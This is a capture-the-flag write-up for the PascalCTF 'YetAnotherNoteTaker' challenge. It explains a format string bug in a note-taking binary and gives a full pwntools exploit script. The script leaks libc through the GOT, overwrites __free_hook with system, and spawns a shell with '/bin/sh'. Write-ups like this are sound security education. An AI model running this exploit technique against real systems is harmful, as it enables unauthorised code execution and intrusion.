# YetAnotherNoteTaker

## Description
> *I've read too many notes recently, I can't take it anymore...*

**Connection:** `nc notetaker.ctf.pascalctf.it 9002`

**Files:** [notetaker.zip](./orig/notetaker.zip)

## Solution
**TL;DR**: Format string vulnerability to overwrite `__free_hook` with `system`

1. Binary has format string vulnerability in "Read note" option (option 1)
2. `printf(buffer)` is called where buffer is user-controlled
3. Uses libc 2.23 which has `__free_hook` writable
4. Menu loop: malloc(16) -> fgets(ptr) -> sscanf -> free(ptr)
5. Overwrite `__free_hook` with `system`, send `/bin/sh` as input

### Vulnerability Analysis
- Option 1 "Read note": `printf(note_buffer)` - format string vuln
- Option 2 "Write note": `read(0, note_buffer, 0x100)` - write up to 256 bytes
- Format string input starts at stack position 8
- GOT entries writable (Partial RELRO)

### Exploit Steps
1. Leak libc via GOT read: `%9$sAAAA` + `p64(puts_GOT)`
2. Calculate `system` and `__free_hook` addresses
3. Write `system` to `__free_hook` using format string with `write_size='short'`
4. Send `/bin/sh` as next menu input - gets malloc'd, then free'd
5. `free(ptr)` -> `__free_hook(ptr)` -> `system("/bin/sh")`

### Exploit Code
```python
from pwn import *

libc = ELF('./libs/libc.so.6')
elf = ELF('./notetaker')

p = remote('notetaker.ctf.pascalctf.it', 9002)

# Leak puts GOT
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'note:', b'%9$sAAAA' + p64(elf.got['puts']))
p.sendlineafter(b'>', b'1')
puts_addr = u64(p.recvline()[1:7].ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']

# Overwrite __free_hook with system
p.sendlineafter(b'>', b'3')
p.sendlineafter(b'>', b'2')
payload = fmtstr_payload(8, {free_hook: system}, write_size='short')
p.sendlineafter(b'note:', payload)
p.sendlineafter(b'>', b'1')
p.recvuntil(b'>')

# Trigger system("/bin/sh")
p.sendline(b'/bin/sh')
p.interactive()
```

### Flag
> `pascalCTF{d1d_y0u_fr_h00k3d_th3_h3ap?}`
